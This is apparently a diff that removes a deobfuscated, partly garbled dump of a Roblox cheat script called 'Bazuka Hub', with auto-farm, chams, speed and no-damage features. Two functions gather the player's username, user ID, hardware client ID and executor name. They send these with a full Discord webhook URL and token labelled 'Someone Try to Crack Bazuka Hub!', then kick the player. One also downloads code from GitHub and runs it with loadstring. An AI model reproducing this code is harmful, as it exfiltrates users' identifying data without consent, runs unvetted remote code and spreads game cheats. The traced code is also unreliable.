-    local _1852 = Color3.fromRGB
-    _1852(0, 0, 0)
-    local _1854 = Color3.fromRGB
-    _1854(160, 160, 160)
-    local _1856 = Color3.fromRGB
-    _1856(0, 0, 0)
-    local _ = game.Lighting.FogColor
-    local _1859 = Color3.fromRGB
-    local _1860 = _1859(255, 255, 255)
-    local _ = game.Lighting.FogEnd
-    local _ = game.Lighting.FogStart
-    local _1863 = Color3.fromRGB
-    local _1864 = _1863(255, 255, 255)
-    local _1865 = Color3.fromRGB
-    local _1866 = _1865(255, 255, 255)
-    local _1867 = Color3.fromRGB
-    local _1868 = _1867(255, 255, 255)
-    local _1869 = Color3.fromRGB
-    local _1870 = _1869(255, 255, 255)
-    task.spawn(function(_1872, _1872_2, _1872_3)
-        writefile(".tests/readfile.txt", "success")
-    end)
-    task.spawn(function(_1875, _1875_2, _1875_3)
-    end)
-    task.spawn(function(_1877, _1877_2, _1877_3)
-        writefile(".tests/writefile.txt", "success")
-    end)
-    task.spawn(function(_1880, _1880_2, _1880_3)
-        writefile(".tests/appendfile.txt", "su")
-    end)
-    local _1881 = _1839.Notification
-    _1881(_1839, {
-        expire = 3,
-        Title = "Bazuka Hub",
-        Desc = "Your executor doesnt support config system!",
-    })
-    local _1883 = _1841.Button
-    local _1884 = _1883(_1841, "Information", "http://www.roblox.com/asset/?id=12707252279")
-    local _1885 = _1884.Section
-    local _1886 = _1885(_1884, "GUI was made by Bazuka_ofcx", "Left")
-    local _1887 = _1886.Button
-    _1887(_1886, {
-        ButtonName = "Copy Link",
-        Title = "GUI Library",
-        Description = "Modified Bazuka Hub",
-    }, function(_1889, _1889_2, _1889_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _1890 = _1886.Button
-    _1890(_1886, {
-        ButtonName = "Copy Link",
-        Title = "Discord link",
-        Description = "Our Discord Server",
-    }, function(_1892, _1892_2, _1892_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _1893 = _1884.Section
-    _1893(_1884, "Information:", "Left")
-    local _1895 = _1884.Section
-    _1895(_1884, "Last Update Changelog:", "Right")
-    local _1897 = _1843.Button
-    local _1898 = _1897(_1843, "Misc Features", "http://www.roblox.com/asset/?id=97163436981193")
-    local _1899 = _1898.Section
-    local _1900 = _1899(_1898, "Automatism", "Left")
-    local _1901 = _1900.Toggle
-    _1901(_1900, {
-        Default = false,
-        Description = "Automatically Waking Up",
-        Title = "Auto Wake Up",
-    }, function(_1903, _1903_2, _1903_3)
-    end)
-    local _1904 = _1900.Toggle
-    _1904(_1900, {
-        Default = false,
-        Description = "Automatically Filling Printer",
-        Title = "Auto Fill Printer",
-    }, function(_1906, _1906_2, _1906_3)
-    end)
-    local _1907 = _1900.Toggle
-    _1907(_1900, {
-        Default = false,
-        Description = "Automatically Collecting Ink",
-        Title = "Auto Ink",
-    }, function(_1909, _1909_2, _1909_3)
-    end)
-    local _1910 = _1898.Section
-    local _1911 = _1910(_1898, "Fast Actions", "Right")
-    local _1912 = _1911.Button
-    _1912(_1911, {
-        ButtonName = "Take",
-        Title = "Box",
-        Description = "",
-    }, function(_1914, _1914_2, _1914_3)
-        local _1915 = game.Players.LocalPlayer
-        local _1916 = _1915.Character
-        local _1917 = _1916.HumanoidRootPart
-        local _ = _1917.CFrame
-        local _1919 = game.Workspace.Camera
-        local _ = _1919.CFrame
-        local _1921 = game.Players.LocalPlayer
-        local _1922 = _1921.Character
-        local _1923 = _1922.HumanoidRootPart
-        local _1924 = CFrame.new
-        local _1925 = _1924(- 28.0855942, 3.31674242, 29.2297077, 0.0914947018, 5.8876150177411546e-08, - 0.995805562, - 7.286653413984823e-08, 1, 5.2429161456757356e-08, 0.995805562, 6.776390648610686e-08, 0.0914947018)
-        _1923.CFrame = _1925
-        local _1926 = game.Workspace.Camera
-        local _1927 = CFrame.new
-        local _1928 = _1927(- 28.5504551, 5.00086546, 29.2312756, 0.00337679265, 0.36824441, - 0.929722965, 1.1641530794914701e-10, 0.92972827, 0.368246526, 0.999994278, - 0.00124349224, 0.00313949957)
-        _1926.CFrame = _1928
-        local _1929 = game.workspace.TaskBoxes
-        local _1930 = _1929.Boxes
-        local _1931 = _1930.Attachment
-        local _1932 = _1931.ProximityPrompt
-        _1932.HoldDuration = 0
-        local _1934 = game.workspace.TaskBoxes
-        local _1935 = _1934.Boxes
-        local _1936 = _1935.Attachment
-        local _ = _1936.ProximityPrompt
-        error("line 1: attempt to call a nil value")
-    end)
-    local _1938 = _1911.Button
-    _1938(_1911, {
-        ButtonName = "Refill",
-        Title = "Water Tank",
-        Description = "",
-    }, function(_1940, _1940_2, _1940_3)
-        local _1941 = game.Players.LocalPlayer
-        local _1942 = _1941.Character
-        local _1943 = _1942.HumanoidRootPart
-        local _ = _1943.CFrame
-        local _1945 = game.Workspace.Camera
-        local _ = _1945.CFrame
-        local _1948 = game.workspace.WTM
-        local _1949 = _1948.WaterTank
-        local _ = _1949.ClickDetector
-        error("line 1: attempt to call a nil value")
-    end)
-    local _1951 = _1911.Button
-    _1951(_1911, {
-        ButtonName = "Clean All",
-        Title = "Garbage",
-        Description = "",
-    }, function(_1953, _1953_2, _1953_3)
-        local _1954 = game.Workspace.Garbage
-        local _1955 = _1954.GetDescendants
-        local _1956 = _1955(_1954)
-        for _1957, _1957_2 in _1956 do
-            local _ = _1957_2.ClassName
-        end
-    end)
-    local _1959 = _1845.Button
-    local _1960 = _1959(_1845, "World Improve", "http://www.roblox.com/asset/?id=11887653877")
-    local _1961 = _1960.Section
-    local _1962 = _1961(_1960, "Vision Upgrade", "Left")
-    local _1963 = _1962.Toggle
-    _1963(_1962, {
-        Default = false,
-        Description = "",
-        Title = "No UI Effects",
-    }, function(_1965, _1965_2, _1965_3)
-    end)
-    local _1966 = _1962.Toggle
-    _1966(_1962, {
-        Default = false,
-        Description = "",
-        Title = "FullBright",
-    }, function(_1968, _1968_2, _1968_3)
-    end)
-    local _1969 = _1962.Slider
-    _1969(_1962, {
-        Min = 0,
-        Title = "Brightness",
-        Max = 10,
-        Default = 0,
-        Description = "Changes the FB",
-    }, function(_1971, _1971_2, _1971_3)
-        math.floor(_1971)
-    end)
-    local _1973 = _1962.Toggle
-    _1973(_1962, {
-        Default = false,
-        Description = "",
-        Title = "Custom FOV",
-    }, function(_1975, _1975_2, _1975_3)
-    end)
-    local _1976 = _1962.Slider
-    _1976(_1962, {
-        Min = 0,
-        Title = "FOV",
-        Max = 120,
-        Default = 80,
-        Description = "",
-    }, function(_1978, _1978_2, _1978_3)
-        math.floor(_1978)
-    end)
-    local _1980 = _1960.Section
-    local _1981 = _1980(_1960, "Custom Fog", "Right")
-    local _1982 = _1981.Toggle
-    _1982(_1981, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_1984, _1984_2, _1984_3)
-    end)
-    local _1985 = _1981.Slider
-    _1985(_1981, {
-        Min = 0,
-        Title = "Fog End",
-        Max = 5000,
-        Default = 1000,
-        Description = "",
-    }, function(_1987, _1987_2, _1987_3)
-        math.floor(_1987)
-    end)
-    local _1989 = _1981.Slider
-    _1989(_1981, {
-        Min = 0,
-        Title = "Fog Start",
-        Max = 2000,
-        Default = 100,
-        Description = "",
-    }, function(_1991, _1991_2, _1991_3)
-        math.floor(_1991)
-    end)
-    type(_1860)
-    local _ = _1860.r
-    local _ = _1860.g
-    local _ = _1860.b
-    local _1997 = _1981.ColorPicker
-    local _1998 = Color3.new
-    local _1999 = _1998()
-    _1997(_1981, {
-        Default = _1999,
-        Description = "",
-        Title = "Fog Color",
-    }, function(_2001, _2001_2, _2001_3)
-    end)
-    local _2002 = _1845.Button
-    local _2003 = _2002(_1845, "Chams", "http://www.roblox.com/asset/?id=12120698352")
-    local _2004 = _2003.Section
-    local _2005 = _2004(_2003, "Shadow Chams", "Left")
-    local _2006 = _2005.Toggle
-    _2006(_2005, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2008, _2008_2, _2008_3)
-    end)
-    local _2009 = _2005.Slider
-    _2009(_2005, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_2011, _2011_2, _2011_3)
-        local _2012, _2012_2, _2012_3 = math.floor(_2011)
-        local _ = _2012 / 100
-    end)
-    type(_1868)
-    local _ = _1868.r
-    local _ = _1868.g
-    local _ = _1868.b
-    local _2018 = _2005.ColorPicker
-    local _2019 = Color3.new
-    local _2020 = _2019()
-    _2018(_2005, {
-        Default = _2020,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_2022, _2022_2, _2022_3)
-    end)
-    local _2023 = _2005.Slider
-    _2023(_2005, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_2025, _2025_2, _2025_3)
-        local _2026, _2026_2, _2026_3 = math.floor(_2025)
-        local _ = _2026 / 100
-    end)
-    type(_1870)
-    local _ = _1870.r
-    local _ = _1870.g
-    local _ = _1870.b
-    local _2032 = _2005.ColorPicker
-    local _2033 = Color3.new
-    local _2034 = _2033()
-    _2032(_2005, {
-        Default = _2034,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_2036, _2036_2, _2036_3)
-    end)
-    local _2037 = _2003.Section
-    local _2038 = _2037(_2003, "Manager Chams", "Right")
-    local _2039 = _2038.Toggle
-    _2039(_2038, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2041, _2041_2, _2041_3)
-    end)
-    local _2042 = _2038.Slider
-    _2042(_2038, {
-        Min = 0,
-        Title = "Outline",
-        Max = 100,
-        Default = 0,
-        Description = "Transparency",
-    }, function(_2044, _2044_2, _2044_3)
-        local _2045, _2045_2, _2045_3 = math.floor(_2044)
-        local _ = _2045 / 100
-    end)
-    type(_1864)
-    local _ = _1864.r
-    local _ = _1864.g
-    local _ = _1864.b
-    local _2051 = _2038.ColorPicker
-    local _2052 = Color3.new
-    local _2053 = _2052()
-    _2051(_2038, {
-        Default = _2053,
-        Description = "",
-        Title = "Outline Color",
-    }, function(_2055, _2055_2, _2055_3)
-    end)
-    local _2056 = _2038.Slider
-    _2056(_2038, {
-        Min = 0,
-        Title = "Filling",
-        Max = 100,
-        Default = 90,
-        Description = "Transparency",
-    }, function(_2058, _2058_2, _2058_3)
-        local _2059, _2059_2, _2059_3 = math.floor(_2058)
-        local _ = _2059 / 100
-    end)
-    type(_1866)
-    local _ = _1866.r
-    local _ = _1866.g
-    local _ = _1866.b
-    local _2065 = _2038.ColorPicker
-    local _2066 = Color3.new
-    local _2067 = _2066()
-    _2065(_2038, {
-        Default = _2067,
-        Description = "",
-        Title = "Filling Color",
-    }, function(_2069, _2069_2, _2069_3)
-    end)
-    local _2070 = _1847.Button
-    local _2071 = _2070(_1847, "Character Modifiying", "http://www.roblox.com/asset/?id=8395621517")
-    local _2072 = _2071.Section
-    local _2073 = _2072(_2071, "Character Actions", "Left")
-    local _2074 = _2073.Button
-    _2074(_2073, {
-        ButtonName = "ReJoin",
-        Title = "ReJoining",
-        Description = "",
-    }, function(_2076, _2076_2, _2076_3)
-        local _TeleportService2077 = game:GetService("TeleportService")
-        local _2078 = _TeleportService2077.Teleport
-        local _Players2079 = game:GetService("Players")
-        local _2080 = _Players2079.LocalPlayer
-        _2078(_TeleportService2077, game.PlaceId, _2080)
-    end)
-    local _2082 = _2071.Section
-    local _2083 = _2082(_2071, "Walk Speed Multiplier", "Right")
-    local _2084 = _2083.Toggle
-    _2084(_2083, {
-        Default = false,
-        Description = "Improve Your Walk Speed",
-        Title = "Speed Miltiplier",
-    }, function(_2086, _2086_2, _2086_3)
-    end)
-    local _2087 = _2083.Slider
-    _2087(_2083, {
-        Min = 1,
-        Title = "Walk Speed",
-        Max = 300,
-        Default = 9,
-        Description = "",
-    }, function(_2089, _2089_2, _2089_3)
-        math.floor(_2089)
-    end)
-    local _2091 = Instance.new
-    local _2092 = _2091("ScreenGui", game.CoreGui)
-    local _2093 = Instance.new
-    local _2094 = _2093("TextButton")
-    _2094.BackgroundTransparency = 1
-    local _2095 = UDim2.new
-    local _2096 = _2095(0, 0, 0, 0)
-    _2094.Size = _2096
-    _2094.Text = " "
-    _2094.Parent = _2092
-    local _2097 = Instance.new
-    local _2098 = _2097("ScreenGui", game.CoreGui)
-    _2098.Name = "BackgroundScreenGui"
-    _2098.Enabled = true
-    local _2099 = Instance.new
-    local _2100 = _2099("TextLabel", _2098)
-    _2100.Name = "BackgroundLabel"
-    local _2101 = Instance.new
-    local _2102 = _2101("UIGradient", _2100)
-    _2102.Name = "BackgroundGradient"
-    local _ = ColorSequence.new
-    error("line 1: attempt to index nil with 'new'")
-end
-fenv.killnoobssimulator = function(_2104, _2104_2, _2104_3)
-    local _2105 = game.Players.LocalPlayer
-    local _2106 = _2105.UserId
-    local _2107 = game.Players.LocalPlayer
-    local _2108 = _2107.DisplayName
-    local _2109 = game.Players.LocalPlayer
-    local _2110 = _2109.Name
-    local _RbxAnalyticsService2111 = game:GetService("RbxAnalyticsService")
-    local _2112 = _RbxAnalyticsService2111.GetClientId
-    local _2113 = _2112(_RbxAnalyticsService2111)
-    local _MarketplaceService2114 = game:GetService("MarketplaceService")
-    local _2115 = _MarketplaceService2114.GetProductInfo
-    local _2116 = _2115(_MarketplaceService2114, game.PlaceId)
-    local _2117 = _2116.Name
-    local _2118, _2118_2 = identifyexecutor()
-    local _2119, _2119_2, _2119_3 = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %s\n**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s \n", _2106, _2108, _2110, _2106, _2113, "03/21/2025", "14:26:59", game.PlaceId, _2117, game.PlaceId, _2118)
-    local _2120 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _2106
-    local _2121 = _2120 .. "&width=150&height=150&format=png"
-    local _HttpService2122 = game:GetService("HttpService")
-    local _2123 = _HttpService2122.JSONEncode
-    local _2124 = _2123(_HttpService2122, {
-        content = "@everyone @here",
-        embeds = {
-            [1] = {
-                type = "rich",
-                description = _2119,
-                color = 16766720,
-                author = {
-                    name = "Someone Try to Crack Bazuka Hub!",
-                    url = "https://roblox.com",
-                },
-                thumbnail = {
-                    url = _2121,
-                },
-            },
-        },
-    })
-    local _2125 = _2124.gsub
-    local _2126 = _2125(_2124, "\"color\":%d+", "\"color\":13828096")
-    http_request({
-        Headers = {
-            ["content-type"] = "application/json",
-        },
-        Url = "https://discord.com/api/webhooks/1352655828632469566/xBrzgbnDhuE9uybK42tGU8UeFh0GMu_i0hXMnAKw7oQhqhnAOc-XcqjKe5VVvBM2Ghzj",
-        Method = "POST",
-        Body = _2126,
-    })
-    local _2128 = game.Players.LocalPlayer
-    local _2129 = _2128.Kick
-    _2129(_2128, "GOT YOU XD!")
-    print("IDK WHEN I DID IT")
-end
-fenv.menuOpen = true
-fenv.backgroundgradientenabled = true
-fenv.backgroundgradienttransparency = 0.5
-fenv.backgroundgradientrotation = 0
-fenv.backgroundgradientcolor1 = _2177
-fenv.backgroundgradientcolor2 = _2179
-fenv.screengirlenabled = true
-fenv.screengirlside = true
-fenv.screengirl = "Tomoko"
-fenv.blurenabled = true
-fenv.blursize = 24
-fenv.nowaterdamage = false
-fenv.nowaterdamageused = false
-fenv.nowaterdamageb = nil
-fenv.nofall = false
-fenv.autofarm = false
-fenv.autofarmb = false
-fenv.chestcooldown = 1
-fenv.chestnumber = 1
-fenv.autochest = false
-fenv.chest = "Common Chest"
-fenv.materialcooldown = 1
-fenv.materialnumber = 1
-fenv.automaterial = false
-fenv.material = "Bar"
-fenv.originaltime = _2180
-fenv.customtime = "12:00:00"
-fenv.hours = 12
-fenv.minutes = 0
-fenv.changetimestatus = false
-fenv.originalfogcolor = _2181
-fenv.customfogcolor = _2183
-fenv.originalfogend = _2184
-fenv.customfogend = 1000
-fenv.originalfogstart = _2185
-fenv.customfogstart = 100
-fenv.changefogstatus = false
-fenv.customguicolor = _2187
-fenv.customshadowcolor = _2189
-fenv.customguidpi = 80
-fenv.customshadowtransparency = 0.5
-fenv.textsize = 0
-fenv.synchronizationstatus = false
-fenv.synchrohitted = false
-fenv.autosaveconfig = false
-fenv.UpdateInfo = "All Games:\n    Info:\n        [+] - Added Time, FPS, Ping\n        [+] - Added Last Update Changelog\n    All Categories:\n        [~] - Improved Canvas Size in Dropdown\n"
-fenv.autochest = _2222
-fenv.chestcooldown = nil
-fenv.chestnumber = _2231
-fenv.chest = _2235
-fenv.automaterial = _2240
-fenv.materialcooldown = nil
-fenv.materialnumber = _2249
-fenv.material = _2253
-fenv.autofarm = _2258
-fenv.nowaterdamage = _2263
-fenv.changetimestatus = _2270
-fenv.hours = _2274
-fenv.minutes = _2278
-fenv.changefogstatus = _2283
-fenv.customfogend = _2287
-fenv.customfogstart = _2291
-fenv.b = _2295
-fenv.g = _2294
-fenv.r = _2293
-fenv.customfogcolor = _2300
-fenv.mouse = _2339
-fenv.tool = _2341
-fenv.babft = function(_2132, _2132_2, _2132_3)
-    local _2133 = game.Players.LocalPlayer
-    local _2134 = _2133.UserId
-    local _2135 = game.Players.LocalPlayer
-    local _2136 = _2135.DisplayName
-    local _2137 = game.Players.LocalPlayer
-    local _2138 = _2137.Name
-    local _RbxAnalyticsService2139 = game:GetService("RbxAnalyticsService")
-    local _2140 = _RbxAnalyticsService2139.GetClientId
-    local _2141 = _2140(_RbxAnalyticsService2139)
-    local _MarketplaceService2142 = game:GetService("MarketplaceService")
-    local _2143 = _MarketplaceService2142.GetProductInfo
-    local _2144 = _2143(_MarketplaceService2142, game.PlaceId)
-    local _2145 = _2144.Name
-    local _2146, _2146_2 = identifyexecutor()
-    local _2147, _2147_2, _2147_3 = string.format("__[Player Info](https://www.roblox.com/users/%d)__ **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %s\n**\nHwid:** %s**\nDate:** %s**\nTime:** %s\n\n__[Game Info](https://www.roblox.com/games/%d)__\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s \n", _2134, _2136, _2138, _2134, _2141, "03/21/2025", "14:26:59", game.PlaceId, _2145, game.PlaceId, _2146)
-    local _2148 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. _2134
-    local _2149 = _2148 .. "&width=150&height=150&format=png"
-    local _HttpService2150 = game:GetService("HttpService")
-    local _2151 = _HttpService2150.JSONEncode
-    local _2152 = _2151(_HttpService2150, {
-        content = "@everyone @here",
-        embeds = {
-            [1] = {
-                type = "rich",
-                description = _2147,
-                color = 16766720,
-                author = {
-                    name = "Someone Try to Crack Bazuka Hub!",
-                    url = "https://roblox.com",
-                },
-                thumbnail = {
-                    url = _2149,
-                },
-            },
-        },
-    })
-    local _2153 = _2152.gsub
-    local _2154 = _2153(_2152, "\"color\":%d+", "\"color\":13828096")
-    http_request({
-        Headers = {
-            ["content-type"] = "application/json",
-        },
-        Url = "https://discord.com/api/webhooks/1352655828632469566/xBrzgbnDhuE9uybK42tGU8UeFh0GMu_i0hXMnAKw7oQhqhnAOc-XcqjKe5VVvBM2Ghzj",
-        Method = "POST",
-        Body = _2154,
-    })
-    local _2156 = game.Players.LocalPlayer
-    local _2157 = _2156.Kick
-    _2157(_2156, "GOT YOU XD!")
-    local _2159 = game:HttpGet("https://raw.githubusercontent.com/Reyn7525/GUI_LIB/refs/heads/main/HydraHub")
-    local _2160 = loadstring(_2159)
-    local _2161 = _2160()
-    local _2162 = _2161.new
-    local _2163 = game.Players.LocalPlayer
-    local _2164 = _2163.DisplayName
-    local _2165 = _2162("Bazuka Hub", _2164, "Bazuka Hub")
-    local _2166 = _2165.Category
-    local _2167 = _2166(_2165, "Info", "http://www.roblox.com/asset/?id=12707252279")
-    local _2168 = _2165.Category
-    local _2169 = _2168(_2165, "Misc", "http://www.roblox.com/asset/?id=97163436981193")
-    local _2170 = _2165.Category
-    local _2171 = _2170(_2165, "Visual", "http://www.roblox.com/asset/?id=13321848320")
-    local _2172 = _2165.Category
-    local _2173 = _2172(_2165, "Character", "http://www.roblox.com/asset/?id=8395621517")
-    local _2174 = _2165.Category
-    _2174(_2165, "Other", "http://www.roblox.com/asset/?id=11932591062")
-    local _2176 = Color3.fromRGB
-    _2176(255, 255, 255)
-    local _2178 = Color3.fromRGB
-    _2178(0, 0, 0)
-    local _ = game.Lighting.TimeOfDay
-    local _ = game.Lighting.FogColor
-    local _2182 = Color3.fromRGB
-    local _2183 = _2182(255, 255, 255)
-    local _ = game.Lighting.FogEnd
-    local _ = game.Lighting.FogStart
-    local _2186 = Color3.fromRGB
-    _2186(160, 160, 160)
-    local _2188 = Color3.fromRGB
-    _2188(0, 0, 0)
-    task.spawn(function(_2191, _2191_2, _2191_3)
-        writefile(".tests/readfile.txt", "success")
-    end)
-    task.spawn(function(_2194, _2194_2, _2194_3)
-    end)
-    task.spawn(function(_2196, _2196_2, _2196_3)
-        writefile(".tests/writefile.txt", "success")
-    end)
-    task.spawn(function(_2199, _2199_2, _2199_3)
-        writefile(".tests/appendfile.txt", "su")
-    end)
-    local _2200 = _2165.Notification
-    _2200(_2165, {
-        expire = 3,
-        Title = "Bazuka Hub",
-        Desc = "Your executor doesnt support config system!",
-    })
-    local _2202 = _2167.Button
-    local _2203 = _2202(_2167, "Information", "http://www.roblox.com/asset/?id=12707252279")
-    local _2204 = _2203.Section
-    local _2205 = _2204(_2203, "GUI was made by Bazuka_ofcx", "Left")
-    local _2206 = _2205.Button
-    _2206(_2205, {
-        ButtonName = "Copy Link",
-        Title = "GUI Library",
-        Description = "Modified Bazuka Hub",
-    }, function(_2208, _2208_2, _2208_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _2209 = _2205.Button
-    _2209(_2205, {
-        ButtonName = "Copy Link",
-        Title = "Discord link",
-        Description = "Our Discord Server",
-    }, function(_2211, _2211_2, _2211_3)
-        error("line 1: attempt to call a nil value")
-    end)
-    local _2212 = _2203.Section
-    _2212(_2203, "Information:", "Left")
-    local _2214 = _2203.Section
-    _2214(_2203, "Last Update Changelog:", "Right")
-    local _2216 = _2169.Button
-    local _2217 = _2216(_2169, "Misc Features", "http://www.roblox.com/asset/?id=97163436981193")
-    local _2218 = _2217.Section
-    local _2219 = _2218(_2217, "Auto Open Chest", "Left")
-    local _2220 = _2219.Toggle
-    _2220(_2219, {
-        Default = false,
-        Description = "Automatically open chests",
-        Title = "Enable",
-    }, function(_2222, _2222_2, _2222_3)
-    end)
-    local _2223 = _2219.Slider
-    _2223(_2219, {
-        Min = 1,
-        Title = "Delay",
-        Max = 100,
-        Default = 10,
-        Description = "",
-    }, function(_2225, _2225_2, _2225_3)
-        local _2226, _2226_2, _2226_3 = math.floor(_2225)
-        local _ = _2226 / 10
-    end)
-    local _2228 = _2219.Slider
-    _2228(_2219, {
-        Min = 1,
-        Title = "Quantity",
-        Max = 50,
-        Default = 1,
-        Description = "",
-    }, function(_2230, _2230_2, _2230_3)
-        math.floor(_2230)
-    end)
-    local _2232 = _2219.Dropdown
-    _2232(_2219, {
-        Title = "Chest Type",
-        Default = "Common Chest",
-        Multi = false,
-        Options = {
-            ["Epic Chest"] = false,
-            ["Uncommon Chest"] = false,
-            ["Common Chest"] = false,
-            ["Legendary Chest"] = false,
-            ["Rare Chest"] = false,
-        },
-        Description = "Choose one of them",
-    }, function(_2234, _2234_2, _2234_3)
-        for _2235, _2235_2 in _2234 do
-        end
-    end)
-    local _2236 = _2217.Section
-    local _2237 = _2236(_2217, "Auto Buy Items", "Right")
-    local _2238 = _2237.Toggle
-    _2238(_2237, {
-        Default = false,
-        Description = "Automatically Buy Items",
-        Title = "Enable",
-    }, function(_2240, _2240_2, _2240_3)
-    end)
-    local _2241 = _2237.Slider
-    _2241(_2237, {
-        Min = 1,
-        Title = "Delay",
-        Max = 100,
-        Default = 10,
-        Description = "",
-    }, function(_2243, _2243_2, _2243_3)
-        local _2244, _2244_2, _2244_3 = math.floor(_2243)
-        local _ = _2244 / 10
-    end)
-    local _2246 = _2237.Slider
-    _2246(_2237, {
-        Min = 1,
-        Title = "Quantity",
-        Max = 50,
-        Default = 1,
-        Description = "",
-    }, function(_2248, _2248_2, _2248_3)
-        math.floor(_2248)
-    end)
-    local _2250 = _2237.Dropdown
-    _2250(_2237, {
-        Title = "Item Type",
-        Default = "Bar",
-        Multi = false,
-        Options = {
-            MarbleBlock = false,
-            Pistons = false,
-            Balloons = false,
-            SmoothWoodBlock = false,
-            CoalBlock = false,
-            Magnets = false,
-            RustedBlock = false,
-            GunMount = false,
-            ["Car Parts"] = false,
-            ConcreteBlock = false,
-            GlassBlock = false,
-            MetalBlock = false,
-            BouncyBlock = false,
-            MiniGun = false,
-            ["Shield Generators"] = false,
-            Camera = false,
-            Rope = false,
-            Sign = false,
-            Delay = false,
-            HingeBlocks = false,
-            CannonMount = false,
-            BrickBlock = false,
-            BoatMotor = false,
-            StoneBlock = false,
-            FabricBlock = false,
-            Harpoon = false,
-            PlasticBlock = false,
-            ["Plane Parts"] = false,
-            Button = false,
-            CannonTurret = false,
-            ["Locked Doors"] = false,
-            Jetpacks = false,
-            SandyBlock = false,
-            LegacyCarPack = false,
-            Cannon = false,
-            Switch = false,
-            LightBulb = false,
-            TitaniumBlock = false,
-            Note = false,
-            CameraDome = false,
-            GrassBlock = false,
-            ObsidianBlock = false,
-            Parachutes = false,
-            IceBlock = false,
-            Spring = false,
-            SticksOfTNT = false,
-            SpikeTrap = false,
-            Bar = false,
-        },
-        Description = "Choose one of them",
-    }, function(_2252, _2252_2, _2252_3)
-        for _2253, _2253_2 in _2252 do
-        end
-    end)
-    local _2254 = _2217.Section
-    local _2255 = _2254(_2217, "Auto Farm Gold", "Left")
-    local _2256 = _2255.Toggle
-    _2256(_2255, {
-        Default = false,
-        Description = "Automatically farm gold",
-        Title = "Enable",
-    }, function(_2258, _2258_2, _2258_3)
-    end)
-    local _2259 = _2217.Section
-    local _2260 = _2259(_2217, "Character Exploit", "Right")
-    local _2261 = _2260.Toggle
-    _2261(_2260, {
-        Default = false,
-        Description = "Disables Water Damage",
-        Title = "No Water DMG",
-    }, function(_2263, _2263_2, _2263_3)
-    end)
-    local _2264 = _2171.Button
-    local _2265 = _2264(_2171, "World Improve", "http://www.roblox.com/asset/?id=11887653877")
-    local _2266 = _2265.Section
-    local _2267 = _2266(_2265, "Ð¡ustom Time", "Left")
-    local _2268 = _2267.Toggle
-    _2268(_2267, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2270, _2270_2, _2270_3)
-    end)
-    local _2271 = _2267.Slider
-    _2271(_2267, {
-        Min = 0,
-        Title = "Hours",
-        Max = 23,
-        Default = 12,
-        Description = "",
-    }, function(_2273, _2273_2, _2273_3)
-        math.floor(_2273)
-    end)
-    local _2275 = _2267.Slider
-    _2275(_2267, {
-        Min = 0,
-        Title = "Minutes",
-        Max = 59,
-        Default = 0,
-        Description = "",
-    }, function(_2277, _2277_2, _2277_3)
-        math.floor(_2277)
-    end)
-    local _2279 = _2265.Section
-    local _2280 = _2279(_2265, "Custom Fog", "Right")
-    local _2281 = _2280.Toggle
-    _2281(_2280, {
-        Default = false,
-        Description = "",
-        Title = "Enable",
-    }, function(_2283, _2283_2, _2283_3)
-    end)
-    local _2284 = _2280.Slider
-    _2284(_2280, {
-        Min = 0,
-        Title = "Fog End",
-        Max = 5000,
-        Default = 1000,
-        Description = "",
-    }, function(_2286, _2286_2, _2286_3)
-        math.floor(_2286)
-    end)
-    local _2288 = _2280.Slider
-    _2288(_2280, {
-        Min = 0,
-        Title = "Fog Start",
-        Max = 2000,
-        Default = 100,
-        Description = "",
-    }, function(_2290, _2290_2, _2290_3)
-        math.floor(_2290)
-    end)
-    type(_2183)
-    local _ = _2183.r
-    local _ = _2183.g
-    local _ = _2183.b
-    local _2296 = _2280.ColorPicker
-    local _2297 = Color3.new
-    local _2298 = _2297()
-    _2296(_2280, {
-        Default = _2298,
-        Description = "",
-        Title = "Fog Color",
-    }, function(_2300, _2300_2, _2300_3)
-    end)
-    local _2301 = _2265.Section
-    local _2302 = _2301(_2265, "Custom Fov", "Right")
-    local _2303 = _2302.Slider
-    local _2304 = game.Workspace.Camera
-    local _2305 = _2304.FieldOfView
-    _2303(_2302, {
-        Min = 0,
-        Title = "Fov",
-        Max = 120,
-        Default = _2305,
-        Description = "Default = 70",
-    }, function(_2307, _2307_2, _2307_3)
-        local _2308 = game.Workspace.Camera
-        local _2309, _2309_2, _2309_3 = math.floor(_2307)
-        _2308.FieldOfView = _2309
-    end)
-    local _2310 = _2173.Button
-    local _2311 = _2310(_2173, "Character Modifiying", "http://www.roblox.com/asset/?id=8395621517")
-    local _2312 = _2311.Section
-    local _2313 = _2312(_2311, "Character Actions", "Left")
-    local _2314 = _2313.Button
-    _2314(_2313, {
-        ButtonName = "Sit",
-        Title = "Sitting down",
-        Description = "",
-    }, function(_2316, _2316_2, _2316_3)
-        local _2317 = game.Players.LocalPlayer
-        local _2318 = _2317.Character
-        local _2319 = _2318.Humanoid
-        _2319.Sit = true
-    end)
-    local _2320 = _2313.Button
-    _2320(_2313, {
-        ButtonName = "Die",
-        Title = "Death",
-        Description = "",
-    }, function(_2322, _2322_2, _2322_3)
-        local _2323 = game.Players.LocalPlayer
-        local _2324 = _2323.Character
-        local _ = _2324.Humanoid
-        error("line 1: attempt to perform arithmetic (unm) on function")
-    end)
-    local _2326 = _2313.Button
-    _2326(_2313, {
-        ButtonName = "ReJoin",
-        Title = "ReJoining",
-        Description = "",
-    }, function(_2328, _2328_2, _2328_3)
-        local _TeleportService2329 = game:GetService("TeleportService")
-        local _2330 = _TeleportService2329.Teleport
